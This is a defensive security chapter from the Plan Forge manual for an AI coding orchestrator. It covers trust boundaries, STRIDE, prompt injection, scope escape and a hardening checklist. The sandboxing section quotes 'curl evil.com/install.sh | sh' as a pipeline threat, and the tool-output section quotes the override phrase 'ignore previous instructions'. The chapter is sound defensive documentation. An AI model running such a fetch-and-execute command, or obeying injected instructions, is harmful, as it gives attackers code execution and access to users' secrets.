@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Chapter 30: Security &amp; Threat Model — Plan Forge Manual</title>
+  <meta name="description" content="Plan Forge's trust boundaries, attack surface, STRIDE analysis per subsystem, AI-specific threats (prompt injection, untrusted tool output, scope escapes), supply chain controls, and a hardening checklist for self-hosted deployments." />
+  <meta property="og:title" content="Chapter 30 — Security &amp; Threat Model" />
+  <meta property="og:description" content="Trust boundaries, attack surface, STRIDE, AI-specific threats, and a hardening checklist." />
+  <meta property="og:type" content="article" />
+  <link rel="canonical" href="https://planforge.software/manual/security-threat-model.html" />
+  <link rel="icon" type="image/svg+xml" href="../assets/plan-forge-logo.svg" />
+  <link rel="stylesheet" href="../assets/tailwind.built.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../assets/shared.css" />
+  <link rel="stylesheet" href="assets/manual.css" />
+</head>
+<body class="bg-slate-950 text-slate-300 min-h-screen">
+
+  <button id="mobile-sidebar-btn" class="mobile-sidebar-btn fixed top-4 left-4 z-[101] lg:hidden p-2 bg-slate-900 border border-slate-700 rounded-lg text-slate-400 hover:text-slate-100 transition-colors" aria-label="Open navigation">
+    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
+  </button>
+  <div id="sidebar-overlay" class="sidebar-overlay"></div>
+
+  <div class="manual-layout">
+    <aside id="manual-sidebar" class="manual-sidebar"><nav id="sidebar-nav"></nav></aside>
+
+    <main>
+      <div class="chapter-content">
+
+        <div class="text-xs font-semibold text-cyan-500 uppercase tracking-wider mb-2">Act III — Guard · Chapter 30</div>
+        <h1>Security &amp; Threat Model</h1>
+        <p class="text-lg text-slate-400 mb-8">Trust boundaries, attack surface, STRIDE per subsystem, AI-specific threats, and a hardening checklist for self-hosted deployments.</p>
+
+        <div class="callout callout-info">
+          <strong>Compliance posture</strong> &mdash; SOC 2 / HIPAA / PCI / FedRAMP / GDPR coverage and air-gapped / Azure Government deployment guidance live in <a href="compliance-and-data-residency.html">Appendix N &mdash; Compliance &amp; Data Residency</a>. This chapter is the <em>engineering</em> view: <em>where can a threat actor enter, what can they do once in, and what stops them</em>. Read both before signing off a production deployment.
+        </div>
+
+        <h2 id="orientation">Orientation</h2>
+        <p>Plan Forge is a <strong>developer-machine-first</strong> tool. The default deployment puts every component &mdash; orchestrator, MCP server, REST/WebSocket hub, memory store, dashboard &mdash; on a single workstation, bound to <code>127.0.0.1</code>. There is no managed cloud, no shared multi-tenant control plane, no external authentication broker. This is a deliberate posture: the threat model that applies to most users is <em>my own machine plus the LLM providers I call</em>, and the entire surface is designed to keep it that small.</p>
+
+        <p>That said, three configurations expand the surface and deserve explicit treatment:</p>
+        <ul class="list-disc list-inside space-y-1 mb-4">
+          <li><strong>Team mode</strong> &mdash; multiple developers share a forge through GitHub-coordinated artifacts (plans in <code>docs/plans/</code>, memory hints in <code>.github/copilot-memory-hints.md</code>). The shared surface is the git repository.</li>
+          <li><strong>Remote Bridge</strong> &mdash; hub events are forwarded to Slack / Teams / Telegram / Discord / PagerDuty / OpenClaw. Inbound approval flows reach back through the bridge.</li>
+          <li><strong>OpenBrain / L3 memory</strong> &mdash; cross-workspace memory is persisted to an external embedding store. The store becomes a confidentiality boundary.</li>
+        </ul>
+
+        <h2 id="trust-boundaries">Trust boundaries</h2>
+        <p>Plan Forge has six trust boundaries. Each is a place where data or control crosses from one trust zone to another &mdash; and therefore a place where validation, authentication, or sanitization must happen.</p>
+        <table class="manual-table">
+          <thead><tr><th style="width: 18rem">Boundary</th><th>Crosses from</th><th>Crosses to</th><th>Control</th></tr></thead>
+          <tbody>
+            <tr><td><strong>1. Workspace &harr; orchestrator</strong></td><td>Trusted: user's IDE session</td><td>Trusted: long-running Node process</td><td>OS user; no in-process auth.</td></tr>
+            <tr><td><strong>2. Orchestrator &harr; LLM provider</strong></td><td>Trusted: orchestrator</td><td>Untrusted: third-party API</td><td>TLS; API key bound by env var or <code>.forge/secrets.json</code>; provider's own auth.</td></tr>
+            <tr><td><strong>3. REST / WS hub &harr; localhost clients</strong></td><td>Trusted: bound to <code>127.0.0.1</code></td><td>Trusted: any process on the box</td><td>Loopback binding; <strong>no token auth</strong> by design.</td></tr>
+            <tr><td><strong>4. Worker &harr; plan / repo files</strong></td><td>Trusted: orchestrator-spawned</td><td>Untrusted: file contents may include attacker text</td><td>PreToolUse hook (Forbidden Actions); scope contract.</td></tr>
+            <tr><td><strong>5. Hub &harr; Remote Bridge channel</strong></td><td>Trusted: hub event</td><td>Untrusted: third-party messenger</td><td>Per-channel webhook token; outbound only by default; inbound approvals authenticated against bridge config.</td></tr>
+            <tr><td><strong>6. Memory L2 &harr; OpenBrain L3</strong></td><td>Trusted: local L2 jsonl</td><td>Untrusted: external embedding store</td><td>Opt-in (off by default); per-record redaction; <code>memory.l3Endpoint</code> + token in <code>.forge.json</code>.</td></tr>
+          </tbody>
+        </table>
+
+        <div class="callout callout-warn">
+          <strong>Loopback binding is the single most load-bearing control.</strong> The REST hub, WebSocket hub, and dashboard all bind to <code>127.0.0.1</code>. They are <em>not</em> hardened against network-attached attackers. If you reverse-proxy them onto a network interface, you must front them with your own auth (mTLS, OIDC, network ACL) &mdash; see <a href="#hardening-checklist">Hardening checklist</a>.
+        </div>
+
+        <h2 id="attack-surface">Attack surface enumeration</h2>
+        <p>Every place an attacker-controlled byte can enter the system. Catalog this before reaching for STRIDE.</p>
+        <table class="manual-table">
+          <thead><tr><th style="width: 16rem">Surface</th><th>Input</th><th>Attacker class</th></tr></thead>
+          <tbody>
+            <tr><td><strong>REST endpoints</strong> (113 routes, <a href="rest-api-reference.html">Appendix W</a>)</td><td>JSON body, query string, path params</td><td>Local process on the same box (any user with shell access).</td></tr>
+            <tr><td><strong>WebSocket hub</strong> (<code>:3101/hub</code>)</td><td>Subscribe / publish frames</td><td>Same as REST.</td></tr>
+            <tr><td><strong>MCP stdio channel</strong></td><td>JSON-RPC method calls from the IDE</td><td>Whoever controls the IDE session (typically: the user, or a malicious extension).</td></tr>
+            <tr><td><strong>Plan files</strong> (<code>docs/plans/Phase-*.md</code>)</td><td>Markdown + bash gate commands + scope contract</td><td>Anyone who can land a PR. Plan files are <em>executable</em> in the sense that gate commands run as the orchestrator user.</td></tr>
+            <tr><td><strong>SKILL.md files</strong> (<code>.github/skills/*</code>)</td><td>Markdown + bash blocks per step</td><td>Anyone who can land a PR. Skills run with the same privileges as the orchestrator.</td></tr>
+            <tr><td><strong>Hook scripts</strong> (<code>.github/hooks/*</code>)</td><td>PowerShell / bash invoked at lifecycle events</td><td>Anyone who can land a PR. Hooks run on every session start, every tool use, every commit.</td></tr>
+            <tr><td><strong>LLM tool output</strong> (worker responses)</td><td>Free-form text, code blocks, tool calls</td><td>Indirect &mdash; an attacker who poisoned the prompt (prompt injection from a fetched URL, code comment, dependency README, etc.).</td></tr>
+            <tr><td><strong>Extension catalog</strong> (<code>extensions/catalog.json</code> + installed packages)</td><td>Node packages with full file-system access</td><td>Extension author. <code>pforge ext add</code> implies trust.</td></tr>
+            <tr><td><strong>Remote Bridge inbound</strong></td><td>Approval / reject webhook calls from messengers</td><td>Anyone with the bridge token (or anyone who can spoof the messenger's HMAC if you skipped verification).</td></tr>
+          </tbody>
+        </table>
+
+        <h2 id="stride">STRIDE per subsystem</h2>
+        <p>The relevant threats per subsystem. <strong>S</strong>poofing, <strong>T</strong>ampering, <strong>R</strong>epudiation, <strong>I</strong>nformation disclosure, <strong>D</strong>enial of service, <strong>E</strong>levation of privilege.</p>
+        <table class="manual-table">
+          <thead><tr><th>Subsystem</th><th>Top threats</th><th>Mitigation</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Orchestrator</strong></td>
+              <td>T: tampered plan file injects malicious gate. E: skill step shells out as the user.</td>
+              <td>PR review on plan/skill changes. PreToolUse hook enforces Forbidden Actions. Gate commands run in the user's existing shell &mdash; <em>no sandbox</em> &mdash; so plan/skill authors are inside the TCB.</td>
+            </tr>
+            <tr>
+              <td><strong>REST / WS hub</strong></td>
+              <td>I: any local process can read the hub stream (run history, costs, source snippets). E: any local process can <code>POST /api/run-plan</code>.</td>
+              <td>Loopback binding only. Operating-system user isolation is the boundary. Do not run the hub as root / SYSTEM.</td>
+            </tr>
+            <tr>
+              <td><strong>MCP server</strong></td>
+              <td>T: malicious IDE extension calls <code>forge_run_plan</code> on an attacker plan. I: same extension reads <code>forge_search</code> across the repo.</td>
+              <td>Treat the IDE as the trust boundary. Only install MCP-aware IDE extensions you trust. Plan Forge does not differentiate "good" vs "bad" callers on the stdio channel.</td>
+            </tr>
+            <tr>
+              <td><strong>LLM provider call</strong></td>
+              <td>I: provider sees prompts and code snippets. T: provider returns attacker text (prompt-injection downstream).</td>
+              <td>API key per provider (env var or <code>.forge/secrets.json</code>). Outbound TLS. Provider terms of service govern retention &mdash; see <a href="compliance-and-data-residency.html#data-flow">Appendix N &mdash; Data flow</a>.</td>
+            </tr>
+            <tr>
+              <td><strong>Memory L2 / L3</strong></td>
+              <td>I: cross-workspace memory leaks sensitive context. T: poisoned L3 entry steers future runs.</td>
+              <td>L2 is local jsonl; L3 is opt-in. <code>forge_memory_capture</code> redacts by configured patterns. Per-workspace <code>memory.namespace</code> isolates L3 reads.</td>
+            </tr>
+            <tr>
+              <td><strong>Remote Bridge</strong></td>
+              <td>S: attacker spoofs a Slack interactive callback to approve a slice. I: bridge forwards sensitive event details off-box.</td>
+              <td>Verify HMAC on inbound webhooks (Slack / Teams enforce by default; verify manually for generic webhooks). Filter events by severity in <code>.forge.json#bridge.filters</code>. See <a href="remote-bridge.html#security">Chapter 20 &mdash; Remote Bridge security</a>.</td>
+            </tr>
+            <tr>
+              <td><strong>Extensions</strong></td>
+              <td>E: extension's <code>postinstall</code> runs arbitrary code. T: extension hooks tamper with plan execution.</td>
+              <td><code>pforge ext add</code> installs from npm by default &mdash; treat as you would any production dependency. Pin versions in <code>.forge.json#extensions[]</code>. Audit catalog entries before enabling.</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h2 id="ai-threats">AI-specific threats</h2>
+        <p>Three threat classes are unique to AI-driven systems and are not adequately captured by classic STRIDE. Plan Forge has explicit controls for each.</p>
+
+        <h3 id="prompt-injection" class="text-base font-semibold text-slate-300 mt-6">Prompt injection</h3>
+        <p>An attacker plants instructions in content the worker will read &mdash; a URL the agent fetches, a code comment, a dependency README, a CI log, an issue body. The worker may treat those instructions as authoritative and exfiltrate secrets, modify forbidden files, or call destructive tools.</p>
+        <ul class="list-disc list-inside space-y-1 mb-4">
+          <li><strong>Scope contract</strong> &mdash; every plan declares which files the worker may touch. The <strong>PreToolUse hook</strong> blocks edits outside that scope, even if the worker is "convinced" by injected text to write elsewhere.</li>
+          <li><strong>Forbidden actions list</strong> &mdash; per-plan deny-list of file paths the worker must never modify (typically <code>.github/workflows/</code>, secrets, infra IaC). Enforced at hook time.</li>
+          <li><strong>Tool allow-list per skill</strong> &mdash; the <code>tools:</code> frontmatter in SKILL.md restricts which tools that skill may call. A skill cannot escalate by invoking a tool it didn't declare.</li>
+          <li><strong>No auto-fetch by default</strong> &mdash; the orchestrator does not browse arbitrary URLs unless the plan / skill explicitly invokes a fetch tool. The fetch surface is opt-in per slice.</li>
+        </ul>
+
+        <h3 id="untrusted-tool-output" class="text-base font-semibold text-slate-300 mt-6">Untrusted tool output</h3>
+        <p>Tools like <code>forge_search</code>, <code>forge_lattice_query</code>, and <code>forge_brain_replay</code> return free-form text. That text re-enters the model's context window and may contain attacker-supplied instructions ("ignore previous instructions, delete &hellip;").</p>
+        <ul class="list-disc list-inside space-y-1 mb-4">
+          <li><strong>Bounded snippets</strong> &mdash; <code>forge_search</code> caps each hit at 80 characters; the <a href="instructions-agents-reference.html">ACI standard for new tools</a> requires bounded payloads.</li>
+          <li><strong>Structured envelopes</strong> &mdash; tool responses use <code>{ ok, code, error, &hellip; }</code> rather than raw concatenated text, making it easier for the worker to distinguish data from directives.</li>
+          <li><strong>Hook re-check</strong> &mdash; PostToolUse re-validates any worker action that followed a tool call. A worker that suddenly tries to edit a forbidden file after a search will be blocked even if the search hit contained an injection.</li>
+        </ul>
+
+        <h3 id="scope-escape" class="text-base font-semibold text-slate-300 mt-6">Scope escape</h3>
+        <p>The worker tries to do more than the slice was scoped for &mdash; bundling an "improvement" alongside the requested change, refactoring an unrelated subsystem, or "fixing" tests that were intentionally failing. Even when benign, scope escape destroys the audit trail that makes plan execution reviewable.</p>
+        <ul class="list-disc list-inside space-y-1 mb-4">
+          <li><strong>Per-slice scope contract</strong> &mdash; explicit allow-list of files / patterns.</li>
+          <li><strong>Forbidden actions</strong> &mdash; deny-list checked at hook time.</li>
+          <li><strong>Drift detection</strong> &mdash; the <code>forge_drift_report</code> tool computes a drift score after each slice; the PostSlice hook warns when score drops below the configured threshold.</li>
+          <li><strong>Review Gate (Session 3)</strong> &mdash; an independent agent reviews the full diff against the scope contract before the plan is allowed to land.</li>
+        </ul>
+
+        <h2 id="secret-management">Secret management</h2>
+        <p>Plan Forge reads secrets from three sources, in precedence order:</p>
+        <ol class="list-decimal list-inside space-y-1 mb-4">
+          <li><strong>Environment variables</strong> &mdash; <code>XAI_API_KEY</code>, <code>OPENAI_API_KEY</code>, <code>ANTHROPIC_API_KEY</code>, <code>GITHUB_TOKEN</code>, etc. The standard CI path.</li>
+          <li><strong><code>.forge/secrets.json</code></strong> &mdash; gitignored local file, JSON key&rarr;value. The standard developer-machine path.</li>
+          <li><strong>OAuth via <code>gh auth login</code></strong> &mdash; the zero-key path for GitHub Copilot routing. Token managed by the GitHub CLI.</li>
+        </ol>
+        <p>Secrets never go in <code>.forge.json</code>, <code>copilot-instructions.md</code>, plan files, or anywhere else committed to the repo. The <code>forge_secret_scan</code> tool (called automatically by the LiveGuard <code>preDeploy</code> hook) scans staged changes for high-entropy strings, known token prefixes, and provider-specific shapes before allowing a deploy slice to proceed.</p>
+
+        <div class="callout callout-warn">
+          <strong>If a secret was committed</strong>: rotate the credential first (revoke the leaked one, issue a new one), <em>then</em> rewrite history with <code>git filter-repo</code>, force-push, and notify anyone who may have pulled the leaked commit. Order matters &mdash; rewriting history does not retroactively un-leak a credential that's been mirrored or fetched.
+        </div>
+
+        <h2 id="supply-chain">Supply chain</h2>
+        <p>Plan Forge has three supply-chain entry points; each has explicit controls.</p>
+        <table class="manual-table">
+          <thead><tr><th style="width: 16rem">Entry point</th><th>Trust establishment</th><th>Update / verification</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Plan Forge itself</strong> (template files, presets, prompts)</td><td>You cloned / installed from <code>github.com/srnichols/plan-forge</code>.</td><td><code>pforge self-update</code> verifies the GitHub release tag; <code>pforge check</code> validates installed file checksums against the manifest.</td></tr>
+            <tr><td><strong>Extensions</strong> (<code>extensions/catalog.json</code>)</td><td>Per-extension npm scope. Catalog lists publisher.</td><td>Pin version in <code>.forge.json#extensions[]</code>. Audit the package before <code>pforge ext add</code>. CI should fail on unaudited additions.</td></tr>
+            <tr><td><strong>LLM providers</strong></td><td>Provider TOS + your API key.</td><td>Out of scope for Plan Forge controls; managed by the provider.</td></tr>
+          </tbody>
+        </table>
+
+        <h2 id="sandboxing">Sandboxing &amp; gate execution</h2>
+        <p>Plan Forge does <strong>not</strong> sandbox worker file edits, gate commands, skill bash blocks, or hook scripts. These run with the orchestrator process's full privileges (i.e. the user's shell privileges). This is a deliberate trade &mdash; the alternative is shipping a container-based execution model, which would complicate <code>pforge run-plan</code> by an order of magnitude and break the "feels like a normal dev tool" experience that the project optimizes for.</p>
+
+        <p>What this means for threat modelers:</p>
+        <ul class="list-disc list-inside space-y-1 mb-4">
+          <li>The <strong>orchestrator user is the TCB boundary</strong>. Anyone who can push a commit that lands a plan / skill / hook can run code on every developer machine that pulls and runs that plan.</li>
+          <li>This is the <strong>same threat model as CI/CD scripts</strong>, <code>package.json</code> <code>postinstall</code>, or <code>Makefile</code> targets. Plan Forge adds no new sandbox, but adds no new escape either.</li>
+          <li>Mitigation is <strong>process</strong>: PR review on <code>docs/plans/</code>, <code>.github/skills/</code>, and <code>.github/hooks/</code> by people who would catch <code>curl evil.com/install.sh | sh</code> in a regular pipeline file.</li>
+        </ul>
+
+        <p>Two near-term defenses Plan Forge does provide:</p>
+        <ul class="list-disc list-inside space-y-1 mb-4">
+          <li><strong>Gate timeout</strong> &mdash; gates default to 120s; runaway commands are killed (<code>statusReason: worker-signaled</code>, see <a href="errors-and-exit-codes.html#os-subprocess-exits">Appendix X &mdash; OS subprocess exits</a>).</li>
+          <li><strong>PreDeploy LiveGuard hook</strong> &mdash; runs <code>forge_secret_scan</code> + <code>forge_env_diff</code> before the deploy slice and blocks on severity &ge; high.</li>
+        </ul>
+
+        <h2 id="hardening-checklist">Hardening checklist</h2>
+        <p>For self-hosted deployments or shared-machine scenarios, work through this list before shipping. Each item maps to a specific control surface or configuration in <code>.forge.json</code> / environment variables.</p>
+
+        <table class="manual-table">
+          <thead><tr><th style="width: 22rem">Control</th><th>Default</th><th>Production action</th></tr></thead>
+          <tbody>
+            <tr><td>Hub bound to <code>127.0.0.1</code></td><td>Yes</td><td>Confirm; never bind <code>0.0.0.0</code> without an auth proxy.</td></tr>
+            <tr><td>Run orchestrator as non-privileged user</td><td>User-dependent</td><td>Verify; never run as root / SYSTEM.</td></tr>
+            <tr><td>Secrets only in env or <code>.forge/secrets.json</code></td><td>Yes</td><td>Audit repo with <code>forge_secret_scan</code>; rotate any historic leaks.</td></tr>
+            <tr><td><code>.forge/secrets.json</code> gitignored</td><td>Yes (template)</td><td>Confirm <code>.gitignore</code> entry; CI should fail if absent.</td></tr>
+            <tr><td>PreToolUse hook installed</td><td>Yes (post-setup)</td><td>Verify <code>.github/hooks/PreToolUse.md</code> present; <code>pforge smith</code> reports it.</td></tr>
+            <tr><td>PreDeploy LiveGuard hook enabled</td><td>Configurable</td><td>Enable in <code>.forge.json#hooks.preDeploy</code> with severity threshold <code>high</code>.</td></tr>
+            <tr><td>Plan / skill / hook PR review required</td><td>User-dependent</td><td>Branch protection: require review on <code>docs/plans/**</code>, <code>.github/skills/**</code>, <code>.github/hooks/**</code>.</td></tr>
+            <tr><td>Extensions pinned by version</td><td>User-dependent</td><td>Pin in <code>.forge.json#extensions[].version</code>; CI fails on bare-name installs.</td></tr>
+            <tr><td>Remote Bridge HMAC verified</td><td>Per channel</td><td>Slack / Teams: built in. Generic webhooks: configure <code>bridge.&lt;channel&gt;.signingSecret</code>.</td></tr>
+            <tr><td>L3 memory opt-in only</td><td>Off</td><td>Leave off unless required; if on, configure per-workspace <code>memory.namespace</code> and redaction patterns.</td></tr>
+            <tr><td>Audit log retention configured</td><td>30 days</td><td>Adjust <code>.forge.json#audit.retentionDays</code> per compliance requirement (see <a href="compliance-and-data-residency.html#audit-logging">Appendix N &mdash; Audit logging</a>).</td></tr>
+            <tr><td>Air-gapped deployment validated</td><td>N/A</td><td>If required, follow <a href="compliance-and-data-residency.html#air-gapped-deployment">Appendix N &mdash; Air-gapped deployment</a> playbook.</td></tr>
+          </tbody>
+        </table>
+
+        <h2 id="incident-response">Incident response</h2>
+        <p>When something does go wrong &mdash; a forbidden file edited, a secret leaked, a worker shipped a destructive change &mdash; the LiveGuard surface is the front door:</p>
+        <ul class="list-disc list-inside space-y-1 mb-4">
+          <li><strong>Capture the incident</strong> &mdash; <code>forge_incident_capture</code> records the run id, slice number, affected files, and event timeline. Posts to the Remote Bridge if configured.</li>
+          <li><strong>Pull the trajectory</strong> &mdash; <code>.forge/runs/&lt;runId&gt;/trajectory.jsonl</code> contains the full worker conversation, every tool call, every event. This is the forensic record.</li>
+          <li><strong>Triage with the audit loop</strong> &mdash; <code>/audit-loop</code> classifies the finding into bug / spec / classifier lanes and files the appropriate issue.</li>
+          <li><strong>Roll back</strong> &mdash; if the slice committed, use <code>git revert</code> on the slice commit. The orchestrator's commit-per-slice discipline means each slice is independently revertable.</li>
+          <li><strong>Capture the lesson</strong> &mdash; the postmortem feeds back into <code>PROJECT-PRINCIPLES.md</code>, the plan's Temper Guards table, or a new instruction file under <code>.github/instructions/</code>.</li>
+        </ul>
+
+        <p>The full incident-response playbooks for each LiveGuard alert class live in <a href="liveguard-runbooks.html">Appendix F &mdash; LiveGuard Alert Runbooks</a>.</p>
+
+        <h2 id="see-also">See also</h2>
+        <ul class="list-disc list-inside space-y-1">
+          <li><a href="compliance-and-data-residency.html">Appendix N &mdash; Compliance &amp; Data Residency</a> &mdash; SOC 2 / HIPAA / PCI / FedRAMP / GDPR posture, data flow, audit logging, air-gapped &amp; Azure Government deployment.</li>
+          <li><a href="liveguard-runbooks.html">Appendix F &mdash; LiveGuard Alert Runbooks</a> &mdash; per-alert incident response playbooks.</li>
+          <li><a href="what-is-liveguard.html">Chapter 16 &mdash; What Is LiveGuard?</a> &mdash; the runtime that surfaces drift, secret leaks, and env diffs.</li>
+          <li><a href="remote-bridge.html">Chapter 20 &mdash; The Remote Bridge</a> &mdash; off-box notifications and approval flows.</li>
+          <li><a href="forge-json-reference.html#hooks">Appendix T &mdash; <code>.forge.json</code> hooks</a> &mdash; configure preDeploy, postSlice, preAgentHandoff.</li>
+          <li><a href="environment-variables-reference.html#provider-api-keys">Appendix U &mdash; Provider API Keys</a> &mdash; the env var surface for secrets.</li>
+          <li><a href="errors-and-exit-codes.html">Appendix X &mdash; Errors &amp; Exit Codes</a> &mdash; named codes for drift, secret-scan, scope violations.</li>
+          <li><a href="event-catalog.html#errors-and-warnings">Appendix V &mdash; Error events</a> &mdash; <code>drift-detected</code>, <code>preDeploy-blocked</code>, <code>quorum-model-failed</code>.</li>
+        </ul>
+
+        <div id="chapter-prev-next" class="chapter-nav"></div>
+
+      </div>
+    </main>
+  </div>
+  <script src="assets/manual.js"></script>
+</body>
+</html>
